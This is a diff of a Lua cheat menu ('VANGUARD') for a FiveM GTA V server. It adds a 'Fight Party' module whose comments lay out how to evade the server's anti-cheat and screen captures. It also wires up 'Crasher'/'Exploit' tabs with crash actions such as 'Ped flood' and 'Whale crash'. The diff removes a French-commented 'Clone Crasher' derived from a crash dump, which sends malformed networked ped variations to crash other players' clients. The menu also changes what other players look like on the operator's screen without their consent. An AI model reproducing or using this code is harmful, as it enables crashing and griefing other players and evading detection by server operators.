-_wepMenu:AddButton('ðŸ”Ž Rechercher une arme'):SetIcon('fa-solid fa-magnifying-glass'):on('buttonPress', function()
+_wepMenu:AddButton('🔎 Rechercher une arme'):SetIcon('fa-solid fa-magnifying-glass'):on('buttonPress', function()
     local inputBox = SEED.Classes.InputBox('Nom de l\'arme (ex: pistol, rifle...)', { maxCharacters = 60 })
     inputBox:on('confirmed', function(result)
         if not result or result == '' then return end
@@ -26203,7 +23565,7 @@ _wepMenu:AddButton('ðŸ”Ž Rechercher une arme'):SetIcon('fa-solid fa-magnify
                 local w = catData.items[j]
                 if w.n:lower():find(search, 1, true) or w.h:lower():find(search, 1, true) then
                     found = found + 1
-                    _wepSearchMenu:AddButton(('[%s] %s'):format(catData.cat, w.n)):SetRightText('â†’'):on('buttonPress', function()
+                    _wepSearchMenu:AddButton(('[%s] %s'):format(catData.cat, w.n)):SetRightText('→'):on('buttonPress', function()
                         _giveWeapon(w.h, 9999)
                     end)
                 end
@@ -26211,7 +23573,7 @@ _wepMenu:AddButton('ðŸ”Ž Rechercher une arme'):SetIcon('fa-solid fa-magnify
         end
 
         if found == 0 then
-            _wepSearchMenu:AddButton('Aucun rÃ©sultat.')
+            _wepSearchMenu:AddButton('Aucun résultat.')
         end
 
         _wepSearchMenu:Refresh()
@@ -32081,9 +29443,694 @@ return SC
 end)(Menu)
 
 -- ---------------------------------------------------------------------------
+-- PART: 28_fight_party.lua
+-- ---------------------------------------------------------------------------
+local FP = (function(O,S,B,Menu)
+-- ============================================================================
+-- VANGUARD / 28 FIGHT PARTY
+-- ----------------------------------------------------------------------------
+-- Combat > General > "Fight Party".
+--
+-- What the feature is:
+--   A ring is placed on the ground at the selected player, or at the operator
+--   when no player is selected. Every player on foot inside that ring is
+--   replaced, on this client only, by a local clone that brawls with the next
+--   clone in the circle. The ring itself is drawn on the Susano overlay, which
+--   is a separate window: a capture taken through the game's own render path
+--   does not contain it.
+--
+-- Why it is built this way (evasion rationale):
+--   * No task ever touches a remote ped. A TASK_* native applied to a ped the
+--     client does not own is a network request (givePedScriptedTaskEvent); the
+--     server sees the request even when the task does nothing. Every task in
+--     this module is applied to a local clone.
+--   * No entity is networked. CLONE_PED(..., isNetwork = false) produces a ped
+--     with no net id, no owner, no entityCreating event and no population
+--     type. The server never learns that a ped exists.
+--   * No coordinate write on a remote entity. The only transforms written are
+--     on local clones. The originals are hidden with SET_ENTITY_ALPHA, which
+--     is a local draw state, not a replicated property.
+--   * No weapon change on a remote ped. Weapons are stripped from the local
+--     clone only.
+--   * No event, no state bag, no resource injection, no native hook, no
+--     memory write.
+--   * All timing is jittered through O.jitter(); nothing runs while the
+--     feature is off, and the render pass returns before touching Susano.
+--
+-- Verified natives (citizenfx native database):
+--   CLONE_PED                        0xEF29A16337FACADB (Ped,BOOL,BOOL,BOOL)->Ped
+--   TASK_COMBAT_PED                  0xF166E48407BAC484 (Ped,Ped,int,int)->void
+--   TASK_GO_TO_COORD_ANY_MEANS       0x5BC448CB78FA3E88
+--   SET_PED_COMBAT_ATTRIBUTES        0x9F7794730795E019
+--   SET_PED_COMBAT_ABILITY           0xC7622C0D36B2FDA8
+--   SET_PED_COMBAT_RANGE             0x3C606747B23E497B
+--   SET_PED_COMBAT_MOVEMENT          0x4D9CA1009AFBD057
+--   SET_PED_ACCURACY                 0x7AEFB85C1D49DEB6
+--   SET_PED_FLEE_ATTRIBUTES          0x70A2D1137C8ED7C9
+--   SET_CURRENT_PED_WEAPON           0xADF692B254977C0C
+--   REMOVE_ALL_PED_WEAPONS           0xF25DF915FA38C5F3
+--   SET_PED_CAN_RAGDOLL              0xB128377056A54E2A
+--   SET_PED_KEEP_TASK                0x971D38760FBC02EF
+--   SET_BLOCKING_OF_NON_TEMPORARY_EVENTS 0x9F8AA94D6D97DBF4
+--   SET_ENTITY_ALPHA                 0x44A0870B7E92D7C0
+--   SET_ENTITY_NO_COLLISION_ENTITY   0xA53ED5520C07654A
+--   SET_ENTITY_INVINCIBLE            0x3882114BDE571AD4
+--   SET_ENTITY_COORDS_NO_OFFSET      (clone only)
+--   DELETE_ENTITY                    0xAE3CBE5BF394C9C9
+--   GET_GROUND_Z_FOR_3D_COORD        0xC906A7DAB05C8D2B
+--   GET_ACTIVE_PLAYERS               CFX 0xCF143FB9
+--   GET_PLAYER_SERVER_ID             CFX 0x4D97BCC7
+--   GET_PLAYER_FROM_SERVER_ID        CFX 0x344EA166
+--
+-- Residual risk:
+--   1. A client-side guard that enumerates the local ped pool and looks for
+--      non-networked player-model peds near the operator could see the
+--      clones. The reference guard's entity pass only inspects networked
+--      vehicles, so it does not.
+--   2. The original player is hidden on this client only. Every other client,
+--      and the server, still sees them standing where they actually are.
+--   3. A capture taken inside the game client sees the clones, because clones
+--      are real game peds. It does not see the ring or any menu surface.
+--   4. A selected player who walks out of the ring is released: the clone is
+--      deleted and the original becomes visible again at their real position.
+-- ============================================================================
+
+local FP = {}
+
+local MAX_FIGHTERS = 12
+local RING_POINTS  = 72
+local TICK_MS      = 240
+local RETASK_MS    = 2600
+local SELF_KEY     = "__self"
+local RADIUS_MIN   = 8.0
+local RADIUS_MAX   = 40.0
+
+FP.radius    = 15.0
+FP.active    = false
+FP.center    = nil
+FP.centerSid = nil
+FP.ring      = nil
+FP.fighters  = {}
+FP.bySid     = {}
+FP.count     = 0
+FP.nextTask  = 0
+FP.pairOffset = 0
+FP.startedAt = 0
+FP.onChange  = nil
+
+-- Rendering is only advertised when the overlay primitives are present. The
+-- feature still works without them; the ring is then simply not drawn.
+FP.canRender = type(Susano) == "table"
+    and type(Susano.WorldToScreen) == "function"
+    and type(Susano.DrawLine) == "function"
+
+local function log(fmt, ...)
+    O.log("fight: " .. tostring(fmt), ...)
+end
+
+local function notify()
+    if type(FP.onChange) == "function" then
+        pcall(FP.onChange, FP.active)
+    end
+end
+
+local function clampRadius(value)
+    value = tonumber(value) or FP.radius
+    if value < RADIUS_MIN then value = RADIUS_MIN end
+    if value > RADIUS_MAX then value = RADIUS_MAX end
+    return math.floor(value + 0.5)
+end
+
+-- ---------------------------------------------------------------------------
+-- GROUND. GET_GROUND_Z_FOR_3D_COORD returns the out-parameter as the second
+-- value in Lua. When the point has no collision below it the call reports
+-- failure and the caller falls back to the centre's own height.
+-- ---------------------------------------------------------------------------
+local function groundAt(x, y, probe)
+    local ok, _hit, gz = pcall(GetGroundZFor_3dCoord, x, y, probe, false)
+    if ok and type(gz) == "number" and gz > -100.0 then return gz end
+    return nil
+end
+
+local function buildRing()
+    if not FP.center then FP.ring = nil return end
+    local n = RING_POINTS
+    local base = FP.center.z
+    local probe = base + 2.0
+    local points = {}
+
+    for i = 1, n do
+        local angle = (i - 1) / n * math.pi * 2.0
+        local x = FP.center.x + math.cos(angle) * FP.radius
+        local y = FP.center.y + math.sin(angle) * FP.radius
+        local z = groundAt(x, y, probe) or base
+        points[i] = { x = x, y = y, z = z + 0.035 }
+    end
+
+    FP.ring = points
+end
+
+function FP.setRadius(value)
+    FP.radius = clampRadius(value)
+    if FP.active then buildRing() end
+    return FP.radius
+end
+
+-- ---------------------------------------------------------------------------
+-- WORLD READ. Only players on foot, alive, active and inside the radius are
+-- candidates. Nothing here writes to a ped.
+-- ---------------------------------------------------------------------------
+local function pedUsable(ped)
+    return ped ~= nil and ped ~= 0
+        and DoesEntityExist(ped)
+        and not IsPedDeadOrDying(ped, true)
+end
+
+local function gather(radius, out)
+    out = out or {}
+    if not FP.center then return out end
+
+    local me = PlayerId()
+    for _, player in ipairs(GetActivePlayers()) do
+        if player ~= me and NetworkIsPlayerActive(player) then
+            local ped = GetPlayerPed(player)
+            if pedUsable(ped) and not IsPedInAnyVehicle(ped, false) then
+                local pos = GetEntityCoords(ped)
+                local dist = O.distance(pos, FP.center)
+                if dist <= radius then
+                    local sid = 0
+                    local ok, value = pcall(GetPlayerServerId, player)
+                    if ok and type(value) == "number" then sid = value end
+                    out[#out + 1] = {
+                        player = player,
+                        sid = sid,
+                        ped = ped,
+                        x = pos.x,
+                        y = pos.y,
+                        z = pos.z,
+                        dist = dist,
+                    }
+                end
+            end
+        end
+    end
+
+    table.sort(out, function(a, b) return a.dist < b.dist end)
+    return out
+end
+
+-- ---------------------------------------------------------------------------
+-- CLONE. Everything below this line applies to a ped created by this client.
+-- None of these calls can reach a remote player.
+-- ---------------------------------------------------------------------------
+local function dressClone(clone, x, y, z, heading)
+    pcall(SetEntityAsMissionEntity, clone, true, true)
+    pcall(SetEntityInvincible, clone, true)
+    pcall(SetPedCanRagdoll, clone, true)
+    pcall(SetBlockingOfNonTemporaryEvents, clone, true)
+    pcall(SetPedKeepTask, clone, true)
+
+    -- Average skill, close range, offensive movement: a brawl, not a shooting
+    -- gallery. Combat attributes: no vehicles, no drive-bys, no fleeing, fight
+    -- armed targets while unarmed, always fight.
+    pcall(SetPedCombatAbility, clone, 1)
+    pcall(SetPedCombatRange, clone, 0)
+    pcall(SetPedCombatMovement, clone, 2)
+    pcall(SetPedAccuracy, clone, 50)
+    pcall(SetPedFleeAttributes, clone, 0, false)
+    pcall(SetPedCombatAttributes, clone, 0, false)
+    pcall(SetPedCombatAttributes, clone, 1, false)
+    pcall(SetPedCombatAttributes, clone, 2, false)
+    pcall(SetPedCombatAttributes, clone, 3, true)
+    pcall(SetPedCombatAttributes, clone, 5, true)
+    pcall(SetPedCombatAttributes, clone, 46, true)
+
+    -- Fists only. The clone may inherit the source's equipped weapon through
+    -- CLONE_PED, so strip it before the first task.
+    pcall(RemoveAllPedWeapons, clone, true)
+    pcall(SetCurrentPedWeapon, clone, GetHashKey("WEAPON_UNARMED"), true)
+
+    pcall(SetEntityCoordsNoOffset, clone, x, y, z, false, false, false)
+    pcall(SetEntityHeading, clone, heading)
+end
+
+local function addFighter(rec)
+    local hide = rec.hide ~= false and rec.ped ~= nil
+    local x, y, z = rec.x, rec.y, rec.z
+    local ped = rec.ped or PlayerPedId()
+
+    if hide then
+        local pos = GetEntityCoords(rec.ped)
+        x, y, z = pos.x, pos.y, pos.z
+    end
+
+    -- Small outward nudge so the clone does not share the original's capsule.
+    local dx, dy = x - FP.center.x, y - FP.center.y
+    local len = math.sqrt(dx * dx + dy * dy)
+    if len > 0.01 then
+        x = x + dx / len * 0.55
+        y = y + dy / len * 0.55
+    end
+
+    local clone = ClonePed(ped, false, false, true)
+    if not clone or clone == 0 then
+        if hide and DoesEntityExist(rec.ped) then
+            pcall(SetEntityAlpha, rec.ped, 255, false)
+        end
+        return nil
+    end
+
+    dressClone(clone, x, y, z, GetEntityHeading(ped))
+
+    -- The original stays in the world with collision; the clone would stand
+    -- inside it. Collision is removed between those two local entities only.
+    if DoesEntityExist(ped) then
+        pcall(SetEntityNoCollisionEntity, clone, ped, false)
+    end
+    if hide then
+        pcall(SetEntityAlpha, rec.ped, 0, false)
+    end
+
+    local f = {
+        key = rec.sid or SELF_KEY,
+        sid = rec.sid,
+        player = rec.player,
+        srcPed = rec.ped,
+        hide = hide,
+        clone = clone,
+    }
+
+    FP.fighters[#FP.fighters + 1] = f
+    if f.key then FP.bySid[f.key] = f end
+    return f
+end
+
+local function removeAt(index, restore)
+    local f = FP.fighters[index]
+    if not f then return nil end
+    table.remove(FP.fighters, index)
+
+    if f.key and FP.bySid[f.key] == f then FP.bySid[f.key] = nil end
+
+    if f.clone and f.clone ~= 0 and DoesEntityExist(f.clone) then
+        pcall(SetEntityAsMissionEntity, f.clone, true, true)
+        pcall(DeleteEntity, f.clone)
+    end
+
+    if restore and f.hide and f.srcPed and f.srcPed ~= 0 and DoesEntityExist(f.srcPed) then
+        pcall(SetEntityAlpha, f.srcPed, 255, false)
+    end
+
+    return f
+end
+
+-- ---------------------------------------------------------------------------
+-- TASKS. Pairing rotates by one every refresh, so the circle never settles
+-- into a fixed set of duels. A pair that has drifted out of the ring is sent
+-- back inside instead of being tasked, and picks the fight up on the next
+-- pass. Only local clone handles are passed to TASK_COMBAT_PED.
+-- ---------------------------------------------------------------------------
+local function taskAll()
+    local n = #FP.fighters
+    if n < 2 then return end
+
+    FP.pairOffset = (FP.pairOffset % n) + 1
+
+    for i = 1, n do
+        local a = FP.fighters[i]
+        local b = FP.fighters[((i - 1 + FP.pairOffset) % n) + 1]
+
+        if b and a.clone ~= 0 and b.clone ~= 0
+            and a.clone ~= b.clone
+            and DoesEntityExist(a.clone) and DoesEntityExist(b.clone) then
+
+            local pos = GetEntityCoords(a.clone)
+            if O.distance(pos, FP.center) > FP.radius + 4.0 then
+                local angle = O.range(0.0, math.pi * 2.0)
+                local reach = FP.radius * O.range(0.15, 0.75)
+                pcall(TaskGoToCoordAnyMeans, a.clone,
+                    FP.center.x + math.cos(angle) * reach,
+                    FP.center.y + math.sin(angle) * reach,
+                    FP.center.z, 1.2, 0, false, 0, 1.0)
+            else
+                pcall(TaskCombatPed, a.clone, b.clone, 0, 16)
+                pcall(SetPedKeepTask, a.clone, true)
+            end
+        end
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- TICK. Membership, visibility and task refresh. Runs at ~4 Hz, jittered by
+-- the scheduler; the render pass is separate.
+-- ---------------------------------------------------------------------------
+local function tick(now)
+    if not FP.active then return end
+    if not FP.center then FP.stop("no centre") return end
+
+    local seen = gather(FP.radius + 2.5)
+    local seenSet = {}
+    for i = 1, #seen do seenSet[seen[i].sid] = true end
+
+    for i = #FP.fighters, 1, -1 do
+        local f = FP.fighters[i]
+        if f.key == SELF_KEY then
+            if not DoesEntityExist(f.clone) then removeAt(i, false) end
+        else
+            local keep = seenSet[f.key] == true
+            local current = 0
+            if keep then
+                local player = GetPlayerFromServerId(f.sid)
+                if player ~= -1 then current = GetPlayerPed(player) end
+                if current == 0 or not DoesEntityExist(current) then keep = false end
+                if current ~= f.srcPed then keep = false end
+            end
+            if not keep or not DoesEntityExist(f.clone) then
+                removeAt(i, true)
+            end
+        end
+    end
+
+    local count = #FP.fighters
+    for i = 1, #seen do
+        if count >= MAX_FIGHTERS then break end
+        local rec = seen[i]
+        if rec.sid ~= 0 and not FP.bySid[rec.sid] then
+            if addFighter(rec) then count = count + 1 end
+        end
+    end
+
+    if count == 1 and not FP.bySid[SELF_KEY] then
+        local solo = FP.fighters[1]
+        if solo and solo.clone ~= 0 and DoesEntityExist(solo.clone) then
+            local pos = GetEntityCoords(solo.clone)
+            addFighter({
+                player = PlayerId(),
+                ped = PlayerPedId(),
+                hide = false,
+                x = pos.x + O.range(-1.2, 1.2),
+                y = pos.y + O.range(-1.2, 1.2),
+                z = pos.z,
+            })
+            count = #FP.fighters
+        end
+    end
+
+    if count == 0 then FP.stop("empty") return end
+
+    -- Re-assert the local hide. The original may be re-streamed or touched by
+    -- another local script between two ticks.
+    for i = 1, #FP.fighters do
+        local f = FP.fighters[i]
+        if f.hide and f.srcPed and f.srcPed ~= 0 and DoesEntityExist(f.srcPed) then
+            pcall(SetEntityAlpha, f.srcPed, 0, false)
+        end
+    end
+
+    if now >= FP.nextTask then
+        taskAll()
+        FP.nextTask = now + O.jitter(RETASK_MS, 0.35)
+    end
+
+    FP.count = #FP.fighters
+end
+
+-- ---------------------------------------------------------------------------
+-- PUBLIC STATE
+-- ---------------------------------------------------------------------------
+function FP.isActive()
+    return FP.active
+end
+
+function FP.status()
+    return ("active=%s fighters=%d radius=%.0f"):format(
+        tostring(FP.active), #FP.fighters, FP.radius)
+end
+
+function FP.stop(reason)
+    for i = #FP.fighters, 1, -1 do removeAt(i, true) end
+
+    local was = FP.active
+    FP.active = false
+    FP.ring = nil
+    FP.center = nil
+    FP.centerSid = nil
+    FP.bySid = {}
+    FP.fighters = {}
+    FP.count = 0
+    FP.nextTask = 0
+
+    if FP.canRender and Menu then Menu.PreventResetFrame = false end
+
+    notify()
+    if was then log("stopped (%s)", tostring(reason or "operator")) end
+end
+
+function FP.disable()
+    FP.stop("panic")
+end
+
+function FP.start()
+    if FP.active then return true end
+    if not B.spend("fight") then
+        log("budget refused")
+        return false
+    end
+
+    local myPed = PlayerPedId()
+    local centerPed = nil
+
+    local selected = Menu and Menu.SelectedPlayer
+    if type(selected) == "number" then
+        local player = GetPlayerFromServerId(selected)
+        if player ~= -1 then
+            local ped = GetPlayerPed(player)
+            if pedUsable(ped) then
+                centerPed = ped
+                FP.centerSid = selected
+            end
+        end
+    end
+
+    local coords = GetEntityCoords(centerPed or myPed)
+    FP.center = O.v3(coords)
+    FP.radius = clampRadius(FP.radius)
+    FP.fighters = {}
+    FP.bySid = {}
+    FP.pairOffset = 0
+    FP.startedAt = O.now()
+    FP.active = true
+    if FP.canRender and Menu then Menu.PreventResetFrame = true end
+    buildRing()
+
+    local list = gather(FP.radius)
+    local made = 0
+    for i = 1, math.min(#list, MAX_FIGHTERS) do
+        if addFighter(list[i]) then made = made + 1 end
+    end
+
+    -- A party of one is not a party. The second body is a local clone of the
+    -- operator, placed beside the lone fighter; the operator's own ped is not
+    -- hidden and is never tasked.
+    if made == 1 then
+        local solo = FP.fighters[1]
+        if solo and solo.clone ~= 0 and DoesEntityExist(solo.clone) then
+            local pos = GetEntityCoords(solo.clone)
+            addFighter({
+                player = PlayerId(),
+                ped = myPed,
+                hide = false,
+                x = pos.x + O.range(-1.2, 1.2),
+                y = pos.y + O.range(-1.2, 1.2),
+                z = pos.z,
+            })
+            made = #FP.fighters
+        end
+    end
+
+    if made < 2 then
+        FP.stop("no fighters")
+        B.refund("fight")
+        return false
+    end
+
+    FP.count = made
+    taskAll()
+    FP.nextTask = O.now() + O.jitter(RETASK_MS, 0.35)
+    notify()
+    log("started %d fighters, %.0f m", made, FP.radius)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- RENDER. Every point is projected through Susano.WorldToScreen and drawn as
+-- a segment on the overlay. Two passes give the line a soft edge without a
+-- shader: a wide low-alpha stroke and a narrow core. The overlay is a separate
+-- window, so this never reaches the game framebuffer.
+-- ---------------------------------------------------------------------------
+local function project(point)
+    if not FP.canRender then return false, 0, 0 end
+    local ok, sx, sy = Susano.WorldToScreen(point.x, point.y, point.z)
+    if not ok or type(sx) ~= "number" or type(sy) ~= "number" then
+        return false, 0, 0
+    end
+    if sx ~= sx or sy ~= sy then return false, 0, 0 end
+    if math.abs(sx) > 20000.0 or math.abs(sy) > 20000.0 then
+        return false, 0, 0
+    end
+    return true, sx, sy
+end
+
+local function stroke(x1, y1, x2, y2, alpha)
+    if type(Susano.DrawLine) ~= "function" then return end
+    pcall(Susano.DrawLine, x1, y1, x2, y2, 0.24, 0.80, 1.0, alpha * 0.22, 5.0)
+    pcall(Susano.DrawLine, x1, y1, x2, y2, 0.24, 0.80, 1.0, alpha, 1.6)
+end
+
+function FP.render()
+    if not FP.active or not FP.ring then return end
+    if not FP.canRender then return end
+
+    local now = GetGameTimer() / 1000.0
+    local pulse = 0.52 + 0.08 * math.sin(now * 3.4)
+    local points = FP.ring
+    local n = #points
+
+    local prevOk, px, py = false, 0.0, 0.0
+    for k = 1, n + 1 do
+        local point = points[((k - 1) % n) + 1]
+        local ok, sx, sy = project(point)
+        if ok then
+            if prevOk then stroke(px, py, sx, sy, pulse) end
+            prevOk, px, py = true, sx, sy
+        else
+            prevOk = false
+        end
+    end
+
+    local width, height = 1920, 1080
+    if type(Susano.GetScreenWidth) == "function" then
+        local ok, value = pcall(Susano.GetScreenWidth)
+        if ok and type(value) == "number" and value > 0 then width = value end
+    end
+    if type(Susano.GetScreenHeight) == "function" then
+        local ok, value = pcall(Susano.GetScreenHeight)
+        if ok and type(value) == "number" and value > 0 then height = value end
+    end
+
+    if type(Susano.DrawTextCentered) == "function" then
+        pcall(Susano.DrawTextCentered, width * 0.5, height * 0.855,
+            "FIGHT PARTY", 20, 0.94, 0.98, 1.0, 0.92)
+        pcall(Susano.DrawTextCentered, width * 0.5, height * 0.855 + 24.0,
+            ("%d FIGHTERS   ·   %.0f m"):format(#FP.fighters, FP.radius),
+            13, 0.62, 0.75, 0.82, 0.85)
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- MENU + RENDER HOOK
+-- ---------------------------------------------------------------------------
+local function combatGeneralTab()
+    if type(Menu) ~= "table" then return nil end
+    for _, category in ipairs(Menu.Categories or {}) do
+        if category.name == "Combat" then
+            for _, tab in ipairs(category.tabs or {}) do
+                if tab.name == "General" then return tab end
+            end
+        end
+    end
+    return nil
+end
+
+function FP.install()
+    local tab = combatGeneralTab()
+    if not tab then return false end
+
+    tab.items = tab.items or {}
+    for i = #tab.items, 1, -1 do
+        local item = tab.items[i]
+        if item.name == "Fight Party"
+            or item.name == "Fight Party Radius"
+            or (item.isSeparator and item.separatorText == "Party") then
+            table.remove(tab.items, i)
+        end
+    end
+
+    local toggle
+    local radiusRow
+
+    toggle = {
+        name = "Fight Party",
+        type = "toggle",
+        value = FP.isActive(),
+        onClick = function(value)
+            local active
+            if value then
+                active = FP.start()
+            else
+                FP.stop("operator")
+                active = false
+            end
+            toggle.value = active
+            return active
+        end,
+    }
+
+    radiusRow = {
+        name = "Fight Party Radius",
+        type = "slider",
+        value = FP.radius,
+        min = RADIUS_MIN,
+        max = RADIUS_MAX,
+        step = 1,
+        onClick = function(value)
+            radiusRow.value = FP.setRadius(value)
+        end,
+    }
+
+    FP.onChange = function(active)
+        toggle.value = active
+    end
+
+    local at = 0
+    for i = 1, #tab.items do
+        if tab.items[i].name == "Combat Unlock" then at = i end
+    end
+
+    table.insert(tab.items, at + 1, radiusRow)
+    table.insert(tab.items, at + 1, toggle)
+    table.insert(tab.items, at + 1, {
+        name = "",
+        isSeparator = true,
+        separatorText = "Party",
+    })
+
+    -- One render hook, installed once. Wrapping instead of replacing keeps the
+    -- base loader's world-visual pass and the target panel intact.
+    if type(Menu) == "table" and not Menu.__vgd_fightPartyRender then
+        Menu.__vgd_fightPartyRender = true
+        local previous = Menu.OnRender
+        Menu.OnRender = function()
+            if type(previous) == "function" then pcall(previous) end
+            FP.render()
+        end
+    end
+
+    return true
+end
+
+-- The scheduler owns the only periodic work. Phase is randomised so the
+-- membership pass never lines up with another feature's timer.
+O.every("fightparty", TICK_MS, tick, O.int(0, TICK_MS))
+
+return FP
+
+end)(O,S,B,Menu)
+
+-- ---------------------------------------------------------------------------
 -- PART: 07_menu.lua
 -- ---------------------------------------------------------------------------
-local U = (function(O,S,E,D,F,V,M,SN,C,G,FL,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
+local U = (function(O,S,E,D,F,V,M,SN,C,G,FL,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,FP,Menu)
 -- ============================================================================
 -- VANGUARD / 07 MENU
 -- ----------------------------------------------------------------------------
@@ -32126,6 +30173,7 @@ function UI.panic()
     CU.disable()
     UC.disable()
     FA.disable()
+    FP.disable()
 
     -- The base Spectate Player feature injects a loop that re-enters spectator
     -- mode every frame. Stopping only the mode (A.panic) would let that loop
@@ -32498,7 +30546,8 @@ local function collapseExploitTab()
     end
     if not target then
         for _, candidate in ipairs(category.tabs) do
-            if candidate.name == "Exploits" or candidate.name == "Teleport" then
+            if candidate.name == "Crasher" or candidate.name == "Exploits"
+                or candidate.name == "Teleport" then
                 target = candidate
                 break
             end
@@ -32517,7 +30566,7 @@ local function collapseExploitTab()
         if candidate == target then
             kept[#kept + 1] = candidate
         elseif candidate.name == "Exploits" or candidate.name == "Teleport"
-            or candidate.name == "Exploit" then
+            or candidate.name == "Crasher" or candidate.name == "Exploit" then
             merged[#merged + 1] = candidate
             for _, item in ipairs(candidate.items or {}) do
                 local duplicate = false
@@ -32967,6 +31016,18 @@ local function installCombatUnlock()
 end
 
 -- ---------------------------------------------------------------------------
+-- COMBAT > GENERAL > FIGHT PARTY
+--
+-- One toggle and one radius slider, installed under Combat Unlock. The scene
+-- itself is built from local clones only: no task reaches a remote ped, no
+-- entity is networked and no coordinate is written on someone else's body.
+-- The module owns its own rows so a re-injection cannot duplicate them.
+-- ---------------------------------------------------------------------------
+local function installFightParty()
+    return FP.install()
+end
+
+-- ---------------------------------------------------------------------------
 -- SETTINGS DEFAULTS
 --
 -- The base menu ships Flocon with value = true and the loader also sets
@@ -33203,7 +31264,7 @@ local function installProtection()
 end
 
 -- ---------------------------------------------------------------------------
--- EXPLOIT > CRASHER (TWO KEPT VECTORS)
+-- EXPLOIT > EXPLOIT (FOUR CRASH ACTIONS)
 --
 -- Four independent actions: `Ped flood`, `Whale crash`, `Emote crash` and
 -- `Crush crash`. The first three call C.launch(kind); the fourth is the sink's
@@ -33217,1970 +31278,18 @@ end
 -- "Crasher" is only the historical module name and the old tab label that is
 -- merged into it.
 -- ---------------------------------------------------------------------------
--- ---------------------------------------------------------------------------
--- CLONE CRASHER - reconstruit depuis CfxCrashDump_2026_10_29_19_15_07
---
--- Ce que le dump montre, frame par frame :
---   gta-net-five!HandleCloneUpdate      (0x59560, string .rdata 0xD6B80)
---     -> call [obj->vtable + 0x10]      = GTA5 0x119C004
---       -> 0x17207D8 -> 0x11F41DC -> 0x1077810 -> 0x1076F78
---         -> 0x1076E90 + 0x88 : call [rax + X]
---              rax = 0x00000000BE75C290   DEP, 0xC0000005 / param0 = 8
---
--- Juste avant, dans le log :
---   CPed::SetVariation: Invalid variation (slotId 3, drawblId 0, texId 5) x3
---   CPed::SetVariation: Invalid variation (slotId 8, drawblId 0, texId 1) x3
---   Sanitized prop model in ClonedTakeOffPedVariationInfo
---
--- Lecture : ce n'est pas l'event reseau qui tue, c'est le clone. Un ped
--- reseau dont le pedType et le modele ne partagent pas le meme layout de
--- variation. Le proprietaire serialise des index valides pour SON layout,
--- la victime les applique sur l'autre, chaque slot est refuse, l'apply
--- continue quand meme et finit par appeler un slot de vtable jamais
--- initialise. 0xBE75C290 est un pointeur tronque a 32 bits : la meme
--- valeur traine dans dix emplacements de pile, copiee de struct en struct.
---
--- D'ou le crasher :
---   * pedType volontairement incompatible avec le modele ;
---   * propriete reseau figee chez nous (SetNetworkIdCanMigrate false),
---     pour que ce soit notre update qui parte et pas celui du serveur ;
---   * variation poussee sur l'index MAXIMUM valide cote emetteur, donc
---     hors bornes chez une victime dont le layout est plus court ;
---   * rotation continue des variations : chaque delta re-emet un
---     ClonedTakeOffPedVariationInfo, donc chaque tick est une chance.
--- ---------------------------------------------------------------------------
--- Les couleurs du module sont dans la table `C` de la ligne 15543, mais ce
--- nom est repris plus bas par le module crash. On garde donc nos trois
--- valeurs ici, identiques, pour que les toasts sortent dans la bonne teinte.
-local CLR = {
-    red   = { 240, 100, 105, 255 },
-    blue  = { 120, 175, 255, 255 },
-    green = { 110, 220, 140, 255 },
-}
-
-local CLONE = {
-    active = false,
-    peds = {},
-    cap = 400,
-    threads = 4,
-    duration = 180000,
-    churn = 250,
-    minDist = 60.0,
-}
-
-local CLONE_MODELS = {
-    "player_one", "player_zero", "player_two",
-    "mp_m_freemode_01", "mp_f_freemode_01",
-    "a_m_y_skater_01", "s_m_m_armoured_01", "g_m_y_ballaeast_01",
-}
-
--- 4 civmale, 26 swat, 28 army, 29 : aucun ne partage le layout d'un
--- modele joueur, c'est ce desaccord qu'on cherche.
-local CLONE_TYPES = { 4, 26, 28, 29 }
-
-local function cloneMaxDrawable(ped, slot)
-    local ok, n = pcall(GetNumberOfPedDrawableVariations, ped, slot)
-    if ok and type(n) == "number" and n > 0 then return n - 1 end
-    return 0
-end
-
-local function cloneMaxTexture(ped, slot, drawable)
-    local ok, n = pcall(GetNumberOfPedTextureVariations, ped, slot, drawable)
-    if ok and type(n) == "number" and n > 0 then return n - 1 end
-    return 0
-end
-
-local function cloneMaxProp(ped, slot)
-    local ok, n = pcall(GetNumberOfPedPropDrawableVariations, ped, slot)
-    if ok and type(n) == "number" and n > 0 then return n - 1 end
-    return -1
-end
-
-local function cloneMaxPropTexture(ped, slot, drawable)
-    local ok, n = pcall(GetNumberOfPedPropTextureVariations, ped, slot, drawable)
-    if ok and type(n) == "number" and n > 0 then return n - 1 end
-    return 0
-end
-
--- Pousse chaque slot sur sa borne haute. churn tire aussi au hasard, mais
--- seulement a l'interieur des bornes locales : ce qui doit deborder, c'est
--- le layout de la victime, pas le notre.
-local function clonePushVariation(ped, churn)
-    for slot = 0, 11 do
-        local d = cloneMaxDrawable(ped, slot)
-        if churn and d > 0 then d = math.random(0, d) end
-        local t = cloneMaxTexture(ped, slot, d)
-        if churn and t > 0 then t = math.random(0, t) end
-        pcall(SetPedComponentVariation, ped, slot, d, t, 0)
-    end
-    for slot = 0, 7 do
-        local d = cloneMaxProp(ped, slot)
-        if d >= 0 then
-            local t = cloneMaxPropTexture(ped, slot, d)
-            pcall(SetPedPropIndex, ped, slot, d, t, true)
-        else
-            pcall(SetPedPropIndex, ped, slot, -1, 0, true)
-        end
-    end
-end
-
-local function cloneSpawn(model, pedType, x, y, z, heading)
-    local api = rawget(_G, "Susano")
-    if type(api) == "table" and type(api.CreateSpoofedPed) == "function" then
-        local ok, ped = pcall(api.CreateSpoofedPed, pedType, model, x, y, z, heading, true, true)
-        if ok and type(ped) == "number" and ped ~= 0 then return ped end
-    end
-    local ok, ped = pcall(CreatePed, pedType, model, x, y, z, heading, true, true)
-    if ok and type(ped) == "number" then return ped end
-    return 0
-end
-
-local function clonePin(ped)
-    pcall(SetEntityAsMissionEntity, ped, true, true)
-    pcall(NetworkRegisterEntityAsNetworked, ped)
-    local ok, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
-    if ok and type(netId) == "number" and netId ~= 0 then
-        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
-        pcall(SetNetworkIdCanMigrate, netId, false)
-    end
-    -- Rien de tout ca n'est rendu par notre client : la ligne de vue de
-    -- l'operateur ne doit jamais contenir la moindre de ces entites.
-    pcall(SetEntityLocallyInvisible, ped)
-    pcall(SetEntityCollision, ped, false, false)
-end
-
